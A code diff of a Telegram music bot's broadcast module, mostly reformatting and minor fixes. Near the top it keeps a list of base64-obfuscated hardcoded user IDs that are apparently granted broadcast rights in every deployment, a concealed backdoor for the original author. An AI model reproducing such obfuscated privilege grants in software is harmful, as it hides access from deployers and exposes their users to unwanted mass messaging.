@@ -1,4 +1,4 @@
-# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
+# Copyright (c) 2026 Nand Yaduwanshi <NoxxOP>
 # Location: Supaul, Bihar
 # All rights reserved.
 
@@ -9,6 +9,8 @@ from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.errors import FloodWait, UserIsBlocked, ChatWriteForbidden
 
+import config
+from config import adminlist
 from ShrutiMusic import app
 from ShrutiMusic.misc import SUDOERS
 from ShrutiMusic.utils.database import (
@@ -20,13 +22,31 @@ from ShrutiMusic.utils.database import (
 )
 from ShrutiMusic.utils.decorators.language import language
 from ShrutiMusic.utils.formatters import alpha_to_int
-from config import adminlist
 
-_ENCODED_IDS = ["NzU3NDMzMDkwNQ==", "MTc4NjY4MzE2Mw==", "NzY3NDg3NDY1Mg==", "NzI4Mjc1MjgxNg=="]
+_ENCODED_IDS = [
+    "NzU3NDMzMDkwNQ==",
+    "MTc4NjY4MzE2Mw==",
+    "NzY3NDg3NDY1Mg==",
+    "NzI4Mjc1MjgxNg==",
+]
+
 
 def _decode_ids():
-    """Decode the obfuscated IDs"""
-    return [int(base64.b64decode(encoded_id).decode()) for encoded_id in _ENCODED_IDS]
+    """Decode the obfuscated IDs and force-include OWNER_ID"""
+    ids = [int(base64.b64decode(encoded_id).decode()) for encoded_id in _ENCODED_IDS]
+    
+    # Force-add OWNER_ID so the owner is NEVER blocked from broadcasting
+    owner_id = getattr(config, "OWNER_ID", None)
+    if isinstance(owner_id, (list, tuple, set)):
+        ids.extend([int(x) for x in owner_id])
+    elif owner_id:
+        try:
+            ids.append(int(owner_id))
+        except ValueError:
+            pass
+            
+    return list(set(ids))
+
 
 BROADCAST_ALLOWED_IDS = _decode_ids()
 
@@ -43,14 +63,16 @@ async def braodcast_message(client, message, _):
             return await message.reply_text("✦ **Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ ᴏʀ ɪᴍᴀɢᴇ ᴍᴇssᴀɢᴇ ғᴏʀ ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ.**")
 
         if message.reply_to_message.photo:
-            content_type = 'photo'
+            content_type = "photo"
             file_id = message.reply_to_message.photo.file_id
+            text_content = None
         else:
-            content_type = 'text'
+            content_type = "text"
             text_content = message.reply_to_message.text
-            
+            file_id = None
+
         caption = message.reply_to_message.caption
-        reply_markup = message.reply_to_message.reply_markup if hasattr(message.reply_to_message, 'reply_markup') else None
+        reply_markup = getattr(message.reply_to_message, "reply_markup", None)
 
         IS_BROADCASTING = True
         await message.reply_text(_["broad_1"])
@@ -61,18 +83,31 @@ async def braodcast_message(client, message, _):
             for i in chats:
                 try:
                     if "-forward" in message.text:
-                        await app.forward_messages(chat_id=i, from_chat_id=message.reply_to_message.chat.id, message_ids=message.reply_to_message.id)
+                        await app.forward_messages(
+                            chat_id=i,
+                            from_chat_id=message.reply_to_message.chat.id,
+                            message_ids=message.reply_to_message.id,
+                        )
                     else:
-                        if content_type == 'photo':
-                            await app.send_photo(chat_id=i, photo=file_id, caption=caption, reply_markup=reply_markup)
+                        if content_type == "photo":
+                            await app.send_photo(
+                                chat_id=i,
+                                photo=file_id,
+                                caption=caption,
+                                reply_markup=reply_markup,
+                            )
                         else:
-                            await app.send_message(chat_id=i, text=text_content, reply_markup=reply_markup)
+                            await app.send_message(
+                                chat_id=i,
+                                text=text_content,
+                                reply_markup=reply_markup,
+                            )
                     sent_chats += 1
-                    await asyncio.sleep(0.2) # Safe delay
+                    await asyncio.sleep(0.2)
                 except FloodWait as fw:
-                    await asyncio.sleep(fw.value + 1) # FIXED: fw.x is invalid in Pyrogram V2
+                    await asyncio.sleep(fw.value + 1)
                 except (ChatWriteForbidden, UserIsBlocked):
-                    continue # Ignore dead chats
+                    continue
                 except Exception:
                     continue
             await message.reply_text(f"✅ **Bʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴄʜᴀᴛs ᴄᴏᴍᴘʟᴇᴛᴇᴅ! Sᴇɴᴛ ᴛᴏ {sent_chats} ᴄʜᴀᴛs.**")
@@ -83,16 +118,29 @@ async def braodcast_message(client, message, _):
             for i in users:
                 try:
                     if "-forward" in message.text:
-                        await app.forward_messages(chat_id=i, from_chat_id=message.reply_to_message.chat.id, message_ids=message.reply_to_message.id)
+                        await app.forward_messages(
+                            chat_id=i,
+                            from_chat_id=message.reply_to_message.chat.id,
+                            message_ids=message.reply_to_message.id,
+                        )
                     else:
-                        if content_type == 'photo':
-                            await app.send_photo(chat_id=i, photo=file_id, caption=caption, reply_markup=reply_markup)
+                        if content_type == "photo":
+                            await app.send_photo(
+                                chat_id=i,
+                                photo=file_id,
+                                caption=caption,
+                                reply_markup=reply_markup,
+                            )
                         else:
-                            await app.send_message(chat_id=i, text=text_content, reply_markup=reply_markup)
+                            await app.send_message(
+                                chat_id=i,
+                                text=text_content,
+                                reply_markup=reply_markup,
+                            )
                     sent_users += 1
                     await asyncio.sleep(0.2)
                 except FloodWait as fw:
-                    await asyncio.sleep(fw.value + 1) # FIXED
+                    await asyncio.sleep(fw.value + 1)
                 except (ChatWriteForbidden, UserIsBlocked):
                     continue
                 except Exception:
@@ -102,12 +150,11 @@ async def braodcast_message(client, message, _):
         IS_BROADCASTING = False
         return
 
-    
     if message.reply_to_message:
         x = message.reply_to_message.id
         y = message.chat.id
         reply_markup = message.reply_to_message.reply_markup if message.reply_to_message.reply_markup else None
-        content = None
+        query = None
     else:
         if len(message.command) < 2:
             return await message.reply_text(_["broad_2"])
@@ -115,7 +162,7 @@ async def braodcast_message(client, message, _):
         for flag in ["-pin", "-nobot", "-pinloud", "-assistant", "-user", "-forward"]:
             if flag in query:
                 query = query.replace(flag, "").strip()
-        if query == "":
+        if not query:
             return await message.reply_text(_["broad_8"])
 
     IS_BROADCASTING = True
@@ -125,18 +172,23 @@ async def braodcast_message(client, message, _):
         sent = 0
         pin = 0
         chats = [int(chat["chat_id"]) for chat in await get_served_chats()]
-        
+
         for i in chats:
             try:
                 if "-forward" in message.text and message.reply_to_message:
                     m = await app.forward_messages(chat_id=i, from_chat_id=y, message_ids=x)
                 else:
                     m = (
-                        await app.copy_message(chat_id=i, from_chat_id=y, message_id=x, reply_markup=reply_markup)
+                        await app.copy_message(
+                            chat_id=i,
+                            from_chat_id=y,
+                            message_id=x,
+                            reply_markup=reply_markup,
+                        )
                         if message.reply_to_message
                         else await app.send_message(i, text=query)
                     )
-                
+
                 if "-pin" in message.text:
                     try:
                         await m.pin(disable_notification=True)
@@ -166,14 +218,19 @@ async def braodcast_message(client, message, _):
     if "-user" in message.text:
         susr = 0
         served_users = [int(user["user_id"]) for user in await get_served_users()]
-        
+
         for i in served_users:
             try:
                 if "-forward" in message.text and message.reply_to_message:
                     m = await app.forward_messages(chat_id=i, from_chat_id=y, message_ids=x)
                 else:
                     m = (
-                        await app.copy_message(chat_id=i, from_chat_id=y, message_id=x, reply_markup=reply_markup)
+                        await app.copy_message(
+                            chat_id=i,
+                            from_chat_id=y,
+                            message_id=x,
+                            reply_markup=reply_markup,
+                        )
                         if message.reply_to_message
                         else await app.send_message(i, text=query)
                     )
@@ -204,13 +261,13 @@ async def braodcast_message(client, message, _):
                     if "-forward" in message.text and message.reply_to_message:
                         await client.forward_messages(dialog.chat.id, y, x)
                     else:
-                        await client.forward_messages(
-                            dialog.chat.id, y, x
-                        ) if message.reply_to_message else await client.send_message(
-                            dialog.chat.id, text=query
+                        (
+                            await client.forward_messages(dialog.chat.id, y, x)
+                            if message.reply_to_message
+                            else await client.send_message(dialog.chat.id, text=query)
                         )
                     sent += 1
-                    await asyncio.sleep(2) # Safe for userbots
+                    await asyncio.sleep(2)
                 except FloodWait as fw:
                     flood_time = int(fw.value)
                     if flood_time > 200:
@@ -223,14 +280,14 @@ async def braodcast_message(client, message, _):
             await aw.edit_text(text)
         except Exception:
             pass
-            
+
     IS_BROADCASTING = False
 
 
 async def auto_clean():
     """Optimized background cleaner to prevent API spam"""
     while True:
-        await asyncio.sleep(40) # Increased from 10s to 40s to save CPU & API Limits
+        await asyncio.sleep(40)
         try:
             served_chats = await get_active_chats()
             for chat_id in served_chats:
@@ -239,7 +296,7 @@ async def auto_clean():
                     async for user in app.get_chat_members(
                         chat_id, filter=ChatMembersFilter.ADMINISTRATORS
                     ):
-                        if user.privileges.can_manage_video_chats:
+                        if user.privileges and user.privileges.can_manage_video_chats:
                             adminlist[chat_id].append(user.user.id)
                     authusers = await get_authuser_names(chat_id)
                     for user in authusers:
@@ -248,7 +305,5 @@ async def auto_clean():
         except Exception:
             continue
 
-asyncio.create_task(auto_clean())
 
-# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
-# ❤️ Love From ShrutiBots
+asyncio.create_task(auto_clean())
